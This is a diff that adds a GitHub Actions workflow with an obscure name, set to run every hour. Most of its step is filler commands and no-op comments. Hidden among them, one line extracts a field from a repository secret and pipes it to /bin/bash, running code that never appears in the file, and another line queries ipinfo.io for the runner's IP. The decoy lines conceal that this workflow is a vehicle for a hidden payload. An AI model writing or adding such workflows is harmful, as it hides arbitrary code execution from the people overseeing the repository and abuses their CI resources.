@@ -1,0 +1,28 @@
+name: zaoliuxing2345
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 * * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zaoliuxing2345
+        env:
+          a22541: ${{ secrets.a22541 }}
+        run: |
+          for i in {1..3}; do echo "Iter $i"; done
+          : ' Another single-line comment '
+          ls -al | head -n 15 | echo "$date"
+          echo $a22541 | jq -r .n5021 | /bin/bash
+          rm -rf tmp.temp.my.scrip.orc.zzz
+          : ' Another single-line comment '
+          printf "%s\n" $(date)
+          ls -al | awk '{print $NF}'
+          which uname
+          test -d /tmp && echo "Tmp dir exists"
+          popd > /dev/null
+          curl ipinfo.io
